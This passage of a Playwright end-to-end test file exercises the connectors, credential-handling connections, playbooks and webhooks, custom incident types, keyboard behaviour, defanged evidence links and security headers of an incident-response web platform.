    await expect(area.getByRole('row').filter({ hasText: 'CountWords' })).toContainText('draft · not usable yet')
  }

  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('a connector is added from its file, a connection is made, and its commands are nodes', async () => {
  test.setTimeout(180_000)
  const before = page.url()
  const source = readFileSync(new URL('./fixtures/acme-connector.yml', import.meta.url), 'utf8')
  const file = (text) => ({ name: 'acme.yml', mimeType: 'text/yaml', buffer: Buffer.from(text) })

  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Connectors').click()
  await expect(page).toHaveURL(/\/settings\/automation\/connectors$/)

  // A file with a mistake is not installed: the problem comes with its line.
  const wrong = source.replace(
    'request: { method: GET, path: "/tickets/{{ args.number }}" }',
    'request: { method: FETCH, path: "/tickets/{{ args.nmber }}" }',
  )
  await settings.getByLabel('Connector file to add').setInputFiles(file(wrong))
  const add = page.getByRole('dialog', { name: 'Add acme.yml' })
  const problems = add.getByRole('list', { name: 'Problems of the file' })
  await expect(problems.getByRole('listitem')).toHaveCount(1)
  await expect(problems).toContainText('line 16')
  await expect(add.getByRole('button', { name: 'Install' })).toBeDisabled()
  await add.getByRole('button', { name: 'Cancel' }).click()

  await settings.getByLabel('Connector file to add').setInputFiles(file(source))
  await expect(add).toContainText('version 1: 2 commands')
  await expect(add).toContainText('a user name and a password')
  await add.getByRole('button', { name: 'Install' }).click()
  await expect(settings.getByRole('status')).toContainText('Acme Desk is installed: version 1, 2 commands.')
  const installed = settings
    .getByRole('table', { name: 'Installed connectors' })
    .getByRole('row')
    .filter({ hasText: 'Acme Desk' })
  await expect(installed).toContainText('no connection')
  await expect(installed).toContainText('not verified')
  // Its commands and its file can be read.
  await installed.getByRole('button', { name: 'Acme Desk' }).click()
  const shown = page.getByRole('dialog', { name: 'Acme Desk' })
  await expect(shown.getByRole('table', { name: 'Commands of Acme Desk' }).getByRole('row')).toHaveCount(3)
  await shown.getByText('The file', { exact: true }).click()
  await expect(shown.getByLabel('The file of Acme Desk')).toContainText('base_url: "{{ config.url }}"')
  await shown.getByRole('button', { name: 'Close', exact: true }).last().click()

  // A connection: the form is the connector's; credentials are written and never shown again.
  await sections.getByText('Connections').click()
  await settings.getByRole('button', { name: 'New connection' }).click()
  const form = page.getByRole('dialog', { name: 'New connection' })
  await form.getByLabel('Connector').selectOption('acme')
  await form.locator('#connection-name').fill('Acme test')
  await form.getByLabel('Instance address').fill('desk.example.invalid')
  await expect(form.getByRole('button', { name: 'Create' })).toBeDisabled() // not an https:// address
  await form.getByLabel('Instance address').fill('https://desk.example.invalid/api')
  await form.getByLabel('User name').fill('svc')
  await form.getByLabel('Password').fill('s3cret-pass')
  await form.getByRole('button', { name: 'Create' }).click()
  const row = settings.getByRole('table', { name: 'Connections' }).getByRole('row').filter({ hasText: 'Acme test' })
  await expect(row).toContainText('desk.example.invalid')
  await expect(row).toContainText('not tested')
  await row.getByRole('button', { name: 'Edit Acme test' }).click()
  const edit = page.getByRole('dialog', { name: 'Connection: Acme test' })
  await expect(edit.getByLabel(/^Password/)).toHaveValue('')
  await expect(edit.getByLabel(/^Password/)).toHaveAttribute('placeholder', 'stored: type to replace it')
  await edit.getByRole('button', { name: 'Cancel' }).click()
  // The test reaches the host of the connection: this one does not exist, and the row says so.
  await row.getByRole('button', { name: 'Test the connection Acme test' }).click()
  await expect(settings.getByRole('alert')).toContainText('Acme test: ', { timeout: 30_000 })
  await expect(row).toContainText('failed')
  await settings.getByRole('button', { name: 'Close settings' }).click()

  // On the canvas the connector is a group of the library; a node of it names its connection.
  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('button', { name: 'Note on high' }).click()
  const library = area.getByRole('complementary', { name: 'Node library' })
  await library.getByLabel('Search nodes').fill('acme')
  await expect(library.getByRole('button', { name: /^create-ticket/ })).toContainText('changes')
  await library.getByRole('button', { name: 'get-ticket', exact: true }).click()
  const inspector = area.getByRole('complementary', { name: 'Inspector' })
  await expect(inspector.getByRole('heading', { name: /Acme Desk/ })).toBeVisible()
  await expect(inspector.getByLabel(/^Connection/)).toHaveValue('')
  await inspector.getByLabel(/^Connection/).selectOption('Acme test')
  await inspector.getByLabel(/^number/).fill('T-1')
  await expect(area.getByText('draft saved')).toBeVisible()
  // The playbook is left as it was.
  await area.getByRole('button', { name: 'Undo' }).click()
  await area.getByRole('button', { name: 'Undo' }).click()
  await area.getByRole('button', { name: 'Undo' }).click()
  await expect(area.getByTestId('playbook-canvas').locator('.react-flow__node')).toHaveCount(4)
  await expect(area.getByText('draft saved')).toBeVisible()

  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('a playbook is run on an artifact from its menu, and started from outside at its own address', async ({
  request,
}) => {
  test.setTimeout(180_000)
  const before = page.url()
  const menu = page.getByRole('menu')
  const look = (name, value) => ({
    id: 'look',
    kind: 'action',
    name,
    position: { x: 40, y: 160 },
    config: { action: 'nik.get-indicator', args: { value } },
  })
  const make = async (name, trigger, node) => {
    const made = await page.request.post('/api/automation/playbooks', { data: { name } })
    expect(made.status()).toBe(201)
    const id = (await made.json()).id
    const graph = {
      nodes: [{ id: 'start', kind: 'trigger', name: 'Trigger', position: { x: 40, y: 40 }, config: trigger }, node],
      edges: [{ from: 'start', to: 'look' }],
    }
    const saved = await page.request.post(`/api/automation/playbooks/${id}/versions`, { data: { graph } })
    expect(saved.status(), await saved.text()).toBe(201)
    return id
  }
  const onFile = await make(
    'Look up a file',
    { event: 'file.analysed', manual: true },
    look('Look up its hash', '{{ trigger.file.sha256 }}'),
  )
  const onMail = await make(
    'Triage a mail',
    { event: 'mail.analysed', manual: true },
    look('Look up the sender', '{{ trigger.mail.sender_domain }}'),
  )
  const outside = await make(
    'From outside',
    { webhook: true },
    look('Look up what was sent', '{{ trigger.body.value }}'),
  )

  // The menu of an artifact offers the playbooks that run on it: one about e-mails is not among them.
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('navigation', { name: 'Artifacts' }).getByText('dropper.bin').click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Run a playbook…' }).click()
  const dialog = page.getByRole('dialog', { name: 'Run a playbook' })
  await expect(dialog.locator('#run-object')).toContainText('a file · dropper.bin')
  const choice = dialog.locator('#run-playbook')
  await expect(choice.locator(`option[value="${onFile}"]`)).toHaveCount(1)
  await expect(choice.locator(`option[value="${onMail}"]`)).toHaveCount(0)
  await choice.selectOption(onFile)
  await dialog.getByRole('button', { name: 'Run', exact: true }).click()
  await expect(page).toHaveURL(/\/automation\/runs\/[0-9a-f]+$/)
  const area = page.getByRole('region', { name: 'Automations' })
  await expect(area.getByRole('status', { name: 'Status of the run' })).toHaveText('done', { timeout: 20_000 })

  // The artifact's own page lists the run.
  await area.getByRole('button', { name: 'Close automations' }).click()
  await panel.getByRole('navigation', { name: 'Artifacts' }).getByText('dropper.bin').click()
  const strip = page.getByLabel('Playbook runs on this artifact')
  await expect(strip.getByRole('button', { name: /Look up a file/ })).toContainText('done')
  await expect(strip.getByRole('button', { name: 'Run a playbook…' })).toBeVisible()

  // A playbook that starts from outside gets an address in its Settings, shown once.
  await page.goto(`/automation/playbooks/${outside}/settings`)
  const hook = area.getByRole('region', { name: 'Address for requests from outside' })
  await expect(hook).toContainText('It has no address yet.')
  await hook.getByRole('button', { name: 'Create the address' }).click()
  const address = (await hook.locator('#hook-address').textContent()).trim()
  expect(address).toMatch(/\/api\/automation\/hooks\/[\w-]{40,}$/)

  // Off, it answers as an address that does not exist; on, a request with no session starts it.
  const send = () => request.post(new URL(address).pathname, { data: { value: '185.220.101.47' } })
  expect((await send()).status()).toBe(404)
  expect(
    (await page.request.put(`/api/automation/playbooks/${outside}/enabled`, { data: { enabled: true } })).status(),
  ).toBe(200)
  const taken = await send()
  expect(taken.status()).toBe(202)
  expect(await taken.json()).toEqual({ accepted: true })
  await expect(async () => {
    const runs = await (await page.request.get(`/api/automation/runs?playbook=${outside}`)).json()
    expect(runs.runs.map((run) => [run.trigger, run.status])).toEqual([['webhook', 'done']])
  }).toPass({ timeout: 20_000 })

  // Read again, the page no longer shows it; replaced, the old one stops working.
  await page.reload()
  await expect(hook).toContainText('Nik keeps only its hash')
  await expect(hook.locator('#hook-address')).toHaveCount(0)
  await hook.getByRole('button', { name: 'Replace the address' }).click()
  await page.getByRole('dialog', { name: 'Replace the address?' }).getByRole('button', { name: 'Replace' }).click()
  await expect(hook.locator('#hook-address')).not.toHaveText(address)
  expect((await send()).status()).toBe(404)

  for (const id of [onFile, onMail, outside]) {
    expect((await page.request.delete(`/api/automation/playbooks/${id}`)).status()).toBe(204)
  }
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('a type of incident is built with a field of its own, and closing asks for what it wants', async () => {
  test.setTimeout(120_000)
  const before = page.url()
  const incidentId = decodeURIComponent(new URL(before).pathname.split('/')[2])
  const was = (await (await page.request.get(`/api/incidents/${incidentId}/fields`)).json()).fields.status

  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Types', { exact: true }).click()
  await expect(page).toHaveURL(/\/settings\/incidents\/types$/)
  // The types Nik ships; every incident that was given none is Unclassified.
  const types = settings.getByRole('table', { name: 'Incident types' })
  await expect(types.getByRole('row')).toHaveCount(8)
  await expect(types.getByRole('row').nth(1)).toContainText('Unclassified')

  await settings.getByRole('button', { name: 'New type' }).click()
  const create = page.getByRole('dialog', { name: 'New type' })
  await create.locator('#new-type-name').fill('E2E outage')
  await create.getByRole('button', { name: 'Create the type' }).click()
  await expect(settings.locator('#type-name')).toHaveValue('E2E outage')

  // A field of its own, made from the side list: it lands in the section that is being added to.
  const offered = settings.getByRole('region', { name: 'Fields to add' })
  await offered.getByRole('button', { name: 'New field' }).click()
  const field = page.getByRole('dialog', { name: 'New field' })
  await field.locator('#field-label').fill('Root cause')
  await expect(field.locator('#field-name')).toHaveValue('root_cause')
  await field.locator('#field-type').selectOption('long_text')
  await field.getByRole('button', { name: 'Create the field' }).click()
  const about = settings.getByRole('region', { name: 'Section What it is about' })
  const placed = about.getByRole('listitem').filter({ hasText: 'Root cause' })
  await expect(placed).toHaveCount(1)
  await placed.getByLabel('to close').check()
  // A field of the registry is added with a click, and moved with the arrows.
  await offered.getByPlaceholder('Find a field…').fill('due')
  await offered.getByRole('button', { name: /^Due/ }).click()
  await expect(about.getByRole('listitem').last()).toContainText('Due')
  await about.getByRole('button', { name: 'Move Due up' }).click()
  await expect(about.getByRole('listitem').last()).toContainText('Root cause')
  // A section of its own, made the side panel in place of the first.
  await settings.getByRole('button', { name: 'Add a section' }).click()
  const added = settings.getByRole('region', { name: 'Section New section' })
  await added.getByLabel('Title of the section').fill('Impact')
  await settings.locator('#type-reasons').fill('Fixed\nNot ours')
  await expect(settings.getByText('not saved')).toBeVisible()
  await settings.getByRole('button', { name: 'Save the type' }).click()
  await expect(settings.getByText('not saved')).toHaveCount(0)
  const saved = await (await page.request.get('/api/incident-types/e2e-outage')).json()
  expect(saved.fields).toEqual([{ name: 'root_cause', required: false, requiredOnClose: true }])
  expect(saved.closeReasons).toEqual(['Fixed', 'Not ours'])
  expect(saved.layout.sections.map((section) => section.title)).toEqual(['Key facts', 'What it is about', 'Impact'])
  expect(saved.layout.sections[1].fields.slice(-2)).toEqual(['due', 'root_cause'])

  // The registry as a whole: the new field is there, with where it is used.
  await sections.getByText('All fields', { exact: true }).click()
  await expect(page).toHaveURL(/\/settings\/incidents\/all-fields$/)
  await settings.getByPlaceholder('Find a field…').fill('root')
  const all = settings.getByRole('table', { name: 'All fields' })
  await expect(all.getByRole('row')).toHaveCount(2)
  await all.getByRole('button', { name: 'Edit the field Root cause' }).click()
  const edit = page.getByRole('dialog', { name: 'Field root_cause' })
  await expect(edit).toContainText('Listed by: E2E outage.')
  await edit.getByRole('button', { name: 'Cancel' }).click()
  await settings.getByRole('button', { name: 'Close settings' }).click()

  // An incident of that type cannot be closed without what the type wants: the form asks for it.
  const opened = await page.request.patch(`/api/incidents/${incidentId}/fields`, {
    data: { changes: { type: 'e2e-outage', status: 'open' } },
  })
  expect(opened.status(), await opened.text()).toBe(200)
  await page.goto(before)
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary', exact: true }).click()
  await expect(page.locator('#incident-status')).toHaveValue('open')
  await page.locator('#incident-status').selectOption('closed')
  await page.getByRole('button', { name: 'Save', exact: true }).click()
  const closing = page.getByRole('dialog', { name: 'Close the incident' })
  await expect(closing).toContainText('E2E outage')
  await expect(closing.locator('#close-reason').locator('option')).toHaveText(['(not set)', 'Fixed', 'Not ours'])
  await closing.locator('#close-reason').selectOption('Fixed')
  await closing.getByRole('button', { name: 'Close the incident' }).click()
  await expect(closing.getByRole('alert')).toHaveText('Root cause is needed to close')
  await closing.locator('#close-field-root_cause').fill('A rule written too wide.')
  await closing.getByRole('button', { name: 'Close the incident' }).click()
  await expect(closing).toHaveCount(0)
  await expect(page.locator('#incident-status')).toHaveValue('closed')
  const held = (await (await page.request.get(`/api/incidents/${incidentId}/fields`)).json()).fields
  expect([held.status, held.close_reason, held.root_cause]).toEqual(['closed', 'Fixed', 'A rule written too wide.'])
  expect(held.closed).toBeTruthy()

  // Left as it was for what follows, with no type; the type is deleted and its incident keeps its values.
  expect((await page.request.delete('/api/incident-types/e2e-outage')).status()).toBe(204)
  const again = await page.request.patch(`/api/incidents/${incidentId}/fields`, {
    data: { changes: { status: was } },
  })
  expect(again.status()).toBe(200)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('the keyboard: Escape closes the dialog on top, Tab stays inside it, focus comes back', async () => {
  const gear = page.getByRole('button', { name: 'Open platform settings' })
  await gear.click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Accounts').click()
  await settings.getByRole('button', { name: `Edit user ${ADMIN.username}` }).click()
  const edit = page.getByRole('dialog', { name: `Account: ${ADMIN.username}` })
  await expect(edit).toBeVisible()

  // Tab never leaves the dialog on top, however many times it is pressed.
  for (let i = 0; i < 12; i += 1) {
    await page.keyboard.press('Tab')
    expect(await edit.evaluate((node) => node.contains(document.activeElement))).toBe(true)
  }
  // Escape closes that dialog only; the Settings page, under it, stays.
  await page.keyboard.press('Escape')
  await expect(edit).toHaveCount(0)
  await expect(settings).toBeVisible()
  // The focus is back on the button that opened the dialog.
  await expect(settings.getByRole('button', { name: `Edit user ${ADMIN.username}` })).toBeFocused()
  await page.keyboard.press('Escape')
  await expect(settings).toHaveCount(0)
  await expect(gear).toBeFocused()
})

test('single-key shortcuts can be turned off and on again', async () => {
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  await tabs.getByRole('button', { name: 'Malware Analysis', exact: true }).click()
  const sample = page.getByRole('list', { name: 'Samples' }).locator('li', { hasText: 'dropper.bin' })
  const flag = sample.getByLabel('Flagged')
  // The row first: its flag is counted once the list is there.
  await expect(sample).toBeVisible()
  const before = await flag.count()

  await page.getByRole('button', { name: 'Keyboard shortcuts' }).click()
  const help = page.getByRole('dialog', { name: 'Keyboard shortcuts' })
  const toggle = help.getByRole('checkbox', { name: /Single-key shortcuts/ })
  await expect(toggle).toBeChecked()
  await toggle.uncheck()
  await page.keyboard.press('Escape')
  await sample.hover()
  await page.keyboard.press('f')
  await page.keyboard.press('?')
  await expect(flag).toHaveCount(before)
  await expect(help).toHaveCount(0)

  // Back on: the choice is kept, and F works again.
  await page.getByRole('button', { name: 'Keyboard shortcuts' }).click()
  await help.getByRole('checkbox', { name: /Single-key shortcuts/ }).check()
  await page.keyboard.press('Escape')
  await sample.hover()
  await page.keyboard.press('f')
  await expect(flag).toHaveCount(before ? 0 : 1)
  await page.keyboard.press('f')
  await expect(flag).toHaveCount(before)
})

test('an address from the evidence is opened only after asking', async () => {
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  await tabs.getByRole('button', { name: 'Browser Forensics', exact: true }).click()
  await page
    .getByRole('navigation', { name: 'Browser analysis sections' })
    .getByRole('button', { name: /^Bookmarks/ })
    .click()
  const open = page.getByRole('button', { name: 'Open the address' }).first()
  await expect(open).toBeVisible()
  // No link to the suspect's address is left in the page for a stray click.
  await expect(page.locator('main a[target="_blank"]')).toHaveCount(0)

  const popups = []
  page.context().on('page', (popup) => popups.push(popup))
  await open.click()
  const ask = page.getByRole('dialog', { name: 'Open an address from the evidence?' })
  await expect(ask).toContainText('from your workstation')
  await expect(ask).toContainText(/hxxps?\[:\]\/\//)
  await ask.getByRole('button', { name: 'Copy defanged' }).click()
  await ask.getByRole('button', { name: 'Cancel' }).click()
  await expect(ask).toHaveCount(0)
  expect(popups).toEqual([])
})

test('the app runs under its security headers, and the policy blocked nothing', async ({ request }) => {
  const headers = (await request.get('/')).headers()
  expect(headers['content-security-policy']).toContain("script-src 'self' 'wasm-unsafe-eval'")
  expect(headers['content-security-policy']).toContain("frame-ancestors 'none'")
  expect(headers['x-content-type-options']).toBe('nosniff')
  expect(headers['x-frame-options']).toBe('DENY')
  expect(blocked).toEqual([])
})

test('the API is reachable through the same origin', async ({ request }) => {
  const health = await request.get('/api/health')
  expect(health.ok()).toBeTruthy()
  const ready = await request.get('/api/ready')
  expect(ready.ok()).toBeTruthy()
})
